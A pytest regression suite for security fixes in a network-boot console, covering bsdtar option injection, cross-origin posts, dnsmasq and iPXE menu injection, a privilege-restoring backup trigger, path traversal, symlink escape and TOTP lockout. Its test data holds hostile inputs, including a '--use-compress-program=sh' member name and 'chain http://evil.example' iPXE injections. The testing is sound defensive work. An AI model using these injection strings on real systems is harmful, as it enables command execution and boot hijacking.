"""Regression tests for security fixes.

Each test pins one hole that was reproduced before it was fixed: ISO member
names read as bsdtar options, form posts from another port of the same host,
upload bodies read before the login check, unchecked text from a restored
backup or an image name reaching dnsmasq.conf and boot.ipxe, a two-factor
code that could be guessed without limit, symlinks in an unpacked ISO that
nginx followed out of the boot root, and image status streams that held a
database connection each until a few of them froze the console.
"""
import asyncio
import io
import os
import sqlite3
import subprocess
from pathlib import Path

import pyotp
import pytest
import starlette.formparsers as formparsers
from sqlalchemy import select

import app.config as app_config
from app.models import Image, LoginLockout, User
from app.services import dnsmasq, ipxe, restore
from app.services import images as image_svc
from tests.test_restore import _make_backup
from tests.test_routes import _login, _seed_admin, _seed_image, _session


# ---------------------------------------------------------------------------
# ISO member names are never read as command-line options
# ---------------------------------------------------------------------------
_EVIL_MEMBER = "--use-compress-program=sh -c touch${IFS}/tmp/x x/vmlinuz"


def test_extract_one_ends_options_before_the_member(tmp_path, monkeypatch):
    seen = []
    monkeypatch.setattr(subprocess, "run", lambda args, **kw: seen.append(args))
    image_svc._extract_one(tmp_path / "a.iso", _EVIL_MEMBER, tmp_path / "out")
    image_svc._extract_one_7z(tmp_path / "a.iso", _EVIL_MEMBER, tmp_path / "out7")
    for args in seen:
        assert args[-2:] == ["--", _EVIL_MEMBER], args


def test_extract_gunzip_ends_options_before_the_member(tmp_path, monkeypatch):
    seen = []

    class FakePopen:
        def __init__(self, args, **kw):
            seen.append(args)
            self.stdout = io.BytesIO()
            self.returncode = 0

        def communicate(self):
            return b"", b""

        def wait(self):
            return 0

    monkeypatch.setattr(subprocess, "Popen", FakePopen)
    image_svc._extract_gunzip(tmp_path / "a.iso", _EVIL_MEMBER, tmp_path / "xen")
    assert seen[0][-2:] == ["--", _EVIL_MEMBER]


# ---------------------------------------------------------------------------
# Cross-origin and anonymous state-changing requests
# ---------------------------------------------------------------------------
def _usernames():
    db = _session()
    try:
        return set(db.scalars(select(User.username)))
    finally:
        db.close()


def _create_user(client, name, **headers):
    return client.post("/users/create", headers=headers, follow_redirects=False,
                       data={"username": name, "password": "SomePassword123",
                             "role": "admin"})


def test_post_from_another_port_of_the_same_host_is_refused(client):
    _login(client)
    r = _create_user(client, "evil", origin="http://testserver:8081")
    assert r.status_code == 403
    assert "evil" not in _usernames()


def test_referer_is_checked_when_origin_is_missing(client):
    _login(client)
    r = _create_user(client, "evil", referer="http://testserver:8081/page.html")
    assert r.status_code == 403
    assert "evil" not in _usernames()


def test_post_from_the_console_itself_still_works(client):
    _login(client)
    r = _create_user(client, "legit", origin="http://testserver")
    assert r.status_code == 303
    assert "legit" in _usernames()


def test_bearer_token_post_without_session_still_works(client):
    _login(client)
    db = _session()
    admin = db.scalars(select(User)).first()
    admin.api_token = "t" * 64
    db.commit()
    db.close()
    client.cookies.clear()
    r = client.post("/users/create", follow_redirects=False,
                    headers={"authorization": "Bearer " + "t" * 64},
                    data={"username": "scripted", "password": "SomePassword123"})
    assert r.status_code == 303
    assert r.headers["location"] != "/login"
    assert "scripted" in _usernames()


def test_anonymous_upload_is_refused_before_the_body_is_read(client, monkeypatch):
    parsed = []
    original = formparsers.MultiPartParser.parse

    async def spy(self):
        parsed.append(True)
        return await original(self)

    monkeypatch.setattr(formparsers.MultiPartParser, "parse", spy)
    r = client.post("/images/upload", follow_redirects=False,
                    files={"file": ("a.iso", b"Z" * 2_000_000,
                                    "application/octet-stream")})
    assert r.status_code == 303
    assert r.headers["location"] == "/login"
    assert parsed == [], "the upload was parsed before the login check"


# ---------------------------------------------------------------------------
# Text from a restored backup or an image name
# ---------------------------------------------------------------------------
def test_backup_with_a_trigger_is_refused(tmp_path):
    path = _make_backup(tmp_path / "b.db")
    conn = sqlite3.connect(path)
    with conn:
        conn.execute("CREATE TRIGGER keep_admin AFTER UPDATE ON users BEGIN "
                     "UPDATE users SET role='admin'; END")
    conn.close()
    with pytest.raises(restore.RestoreError, match="trigger keep_admin"):
        restore.inspect_backup(path)


def test_newline_in_a_setting_cannot_add_a_dnsmasq_directive():
    conf = dnsmasq.build_config({
        "server_ip": "10.0.0.5", "boot_interface": "eth0", "svc_dhcp": "1",
        "svc_tftp": "1", "dhcp_mode": "full",
        "dhcp_range_start": "10.0.0.100\ndhcp-script=/tmp/x",
        "dhcp_range_end": "10.0.0.200", "dhcp_subnet_mask": "255.255.255.0",
        "dhcp_gateway": "10.0.0.1", "dhcp_dns": "10.0.0.1"})
    assert not any(line.startswith("dhcp-script") for line in conf.splitlines())


def test_separator_words_cannot_add_ipxe_commands(client):
    _seed_image(name="Foo ; chain http://evil.example/x.ipxe",
                boot_args="quiet && shell fetch=${boot-url}/os/1/fs")
    db = _session()
    try:
        menu = ipxe.render(db)
    finally:
        db.close()
    item = next(line for line in menu.splitlines() if line.startswith("item os_"))
    kernel = next(line for line in menu.splitlines() if line.startswith("kernel "))
    assert " ; " not in item
    assert " && " not in kernel
    # Boot arguments keep ${...}: live images point the kernel at ${boot-url}.
    assert "fetch=${boot-url}/os/1/fs" in kernel


def test_newline_in_the_menu_title_stays_on_one_line(client):
    from app.store import set_setting
    db = _session()
    try:
        set_setting(db, "menu_title", "Beacon\nchain http://evil.example/x.ipxe")
        menu = ipxe.render(db)
    finally:
        db.close()
    assert "\nchain http://evil.example" not in menu


@pytest.mark.parametrize("stored", ["/etc/passwd", "../pxe.db", "..", "a/../../b.iso"])
def test_image_file_paths_stay_in_the_images_folder(stored):
    path = image_svc.iso_path(stored)
    assert path.parent == app_config.IMAGE_DIR


def test_deleting_a_restored_image_cannot_remove_other_files(client, tmp_path,
                                                            monkeypatch):
    monkeypatch.setattr(app_config, "IMAGE_DIR", tmp_path / "images")
    (tmp_path / "images").mkdir()
    victim = tmp_path / "victim.txt"
    victim.write_text("keep me")
    db = _session()
    try:
        img = Image(name="x", filename=str(victim), status="error")
        db.add(img)
        db.commit()
        image_svc.delete_image(db, img)
    finally:
        db.close()
    assert victim.exists()
    assert Path(victim).read_text() == "keep me"


# ---------------------------------------------------------------------------
# The two-factor code can't be guessed without limit
# ---------------------------------------------------------------------------
def _seed_totp_admin():
    _seed_admin()
    secret = pyotp.random_base32()
    db = _session()
    try:
        user = db.execute(select(User).where(User.username == "testadmin")).scalar_one()
        user.totp_secret = secret
        user.totp_enabled = 1
        db.commit()
    finally:
        db.close()
    return pyotp.TOTP(secret)


def _wrong_code(totp):
    # A code that isn't valid in any window the server accepts right now.
    return next(c for c in ("000000", "111111", "222222", "333333")
                if not totp.verify(c, valid_window=2))


def test_two_factor_step_locks_after_five_wrong_codes(client):
    totp = _seed_totp_admin()
    r = client.post("/login", data={"username": "testadmin",
                                    "password": "AdminPass123!"})
    assert r.status_code == 200  # followed to the code page
    wrong = _wrong_code(totp)
    for _ in range(5):
        r = client.post("/login/totp", data={"code": wrong})
        assert "Invalid code" in r.text
    # Locked now: even the right code is refused without being checked.
    r = client.post("/login/totp", data={"code": totp.now()})
    assert "Too many failed attempts" in r.text
    assert client.get("/", follow_redirects=False).status_code == 303


def test_right_code_still_signs_in_and_clears_failures(client):
    totp = _seed_totp_admin()
    client.post("/login", data={"username": "testadmin", "password": "AdminPass123!"})
    wrong = _wrong_code(totp)
    for _ in range(4):
        client.post("/login/totp", data={"code": wrong})
    r = client.post("/login/totp", data={"code": totp.now()}, follow_redirects=False)
    assert r.status_code == 303 and r.headers["location"] == "/"
    db = _session()
    try:
        user = db.execute(select(User).where(User.username == "testadmin")).scalar_one()
        assert db.get(LoginLockout, f"totp:{user.id}") is None
    finally:
        db.close()


# ---------------------------------------------------------------------------
# Symlinks in an unpacked ISO can't reach outside it
# ---------------------------------------------------------------------------
def test_unpacked_tree_drops_links_that_leave_it(tmp_path, monkeypatch):
    dest = tmp_path / "os" / "1" / "tree"

    def fake_bsdtar(args, **kw):
        (dest / "images").mkdir(parents=True)
        (dest / "images" / "install.img").write_bytes(b"img")
        os.symlink("/etc/passwd", dest / "images" / "abs")
        os.symlink("../../../../../etc/hostname", dest / "images" / "rel")
        os.symlink("/", dest / "rootdir")
        # Debian and Ubuntu ISOs link their name to the ISO root; those stay.
        os.symlink(".", dest / "debian")
        os.symlink("install.img", dest / "images" / "alias")
    monkeypatch.setattr(subprocess, "run", fake_bsdtar)
    image_svc._extract_tree(tmp_path / "a.iso", dest)
    assert not os.path.lexists(dest / "images" / "abs")
    assert not os.path.lexists(dest / "images" / "rel")
    assert not os.path.lexists(dest / "rootdir")
    assert os.path.islink(dest / "debian")
    assert (dest / "images" / "alias").read_bytes() == b"img"


# ---------------------------------------------------------------------------
# Open status streams don't hold database connections
# ---------------------------------------------------------------------------
class _FakeDB:
    closed = False

    def close(self):
        self.closed = True


class _FakeRequest:
    def __init__(self, ticks):
        self.ticks = ticks

    async def is_disconnected(self):
        self.ticks -= 1
        return self.ticks < 0


def _user(uid=1):
    return User(id=uid, username="u", password_hash="x", role="user")


def test_status_stream_returns_its_connection_before_streaming(monkeypatch):
    from app.routers import images as images_router
    monkeypatch.setattr(images_router, "_status_snapshot", lambda: [(1, "ready", None)])
    real_sleep = asyncio.sleep
    monkeypatch.setattr(asyncio, "sleep", lambda s: real_sleep(0))
    db = _FakeDB()

    async def run():
        resp = await images_router.images_sse(_FakeRequest(1), _user(), db)
        assert db.closed, "the sign-in session is still checked out"
        chunks = [c async for c in resp.body_iterator]
        return chunks
    chunks = asyncio.run(run())
    assert chunks == [": heartbeat\n\n"]
    assert images_router._sse_open == {}


def test_status_streams_per_user_are_capped(monkeypatch):
    from app.routers import images as images_router
    monkeypatch.setattr(images_router, "_sse_open",
                        {1: images_router.SSE_MAX_PER_USER})
    resp = asyncio.run(images_router.images_sse(_FakeRequest(1), _user(1), _FakeDB()))
    assert resp.status_code == 429
    resp = asyncio.run(images_router.images_sse(_FakeRequest(0), _user(2), _FakeDB()))
    assert resp.status_code == 200
